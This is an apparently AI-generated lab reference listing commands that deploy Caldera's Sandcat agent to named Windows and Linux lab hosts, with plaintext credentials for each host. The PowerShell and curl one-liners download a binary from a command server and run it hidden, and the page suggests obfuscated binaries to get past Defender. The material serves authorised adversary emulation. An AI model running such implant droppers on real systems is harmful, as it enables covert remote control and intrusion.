---
type: Lab Reference
title: Target Deployment Commands
description: Ready-to-use Sandcat agent deployment commands for each target host in the lab, covering Windows and Linux targets.
tags:
  - lab
  - targets
  - deployment
  - sandcat
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T16:52:00Z'
status: stable
---

# Target Deployment Commands

Agent deployment commands for each lab target. All commands pull Sandcat from `http://192.168.8.121:8888` (caldera-1).

## Windows Targets

### windows-client-11 (192.168.3.32) — `lab-user / Paloalto1!`

**PowerShell (run on the target host):**
```powershell
$url="http://192.168.8.121:8888/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1]
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)
Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

**One-liner:**
```powershell
$url="http://192.168.8.121:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go-windows");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1];[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

---

### windows-the-boss (192.168.3.31) — `lab-user / Paloalto1!`

Same PowerShell commands as above. Use `-group boss` to keep agents in separate groups for targeted operations.

---

### windows-dc (192.168.1.31) — `administrator / Paloalto1!`

Same PowerShell commands. Use `-group dc` to isolate DC agents. Note: Defender may be active; use `-contact tcp` or an obfuscated binary if HTTP is blocked.

---

### windows-dev-station (192.168.8.31) — `lab-user / Paloalto1!`

Same PowerShell commands. Useful for testing agent connectivity before deploying to other segments.

## Linux Targets

### linux-engine (192.168.1.22) — `lab-user / [public key]`

```bash
curl -s -X POST \
  -H "file:sandcat.go-linux" \
  -H "platform:linux" \
  http://192.168.8.121:8888/file/download > /tmp/sandcat && \
  chmod +x /tmp/sandcat && \
  nohup /tmp/sandcat -server http://192.168.8.121:8888 -group red &
```

### linux-jumpbox (192.168.200.100) — `lab-user / [blank]`

Same curl command as above.

## Recommended Group Names

| Group | Hosts |
|---|---|
| `red` | All general-purpose agents |
| `workstations` | windows-client-11, windows-the-boss |
| `dc` | windows-dc |
| `kali` | threat-emulator (192.168.8.122) — required for EMU multi-host profiles |

## Verifying Agent Check-In

After deploying, confirm via API:
```powershell
# Within authenticated session
$agents = (Invoke-WebRequest -Uri "http://192.168.8.121:8888/api/v2/agents" `
    -WebSession $session -UseBasicParsing).Content | ConvertFrom-Json
$agents | Format-Table paw, host, platform, username, group, alive
```
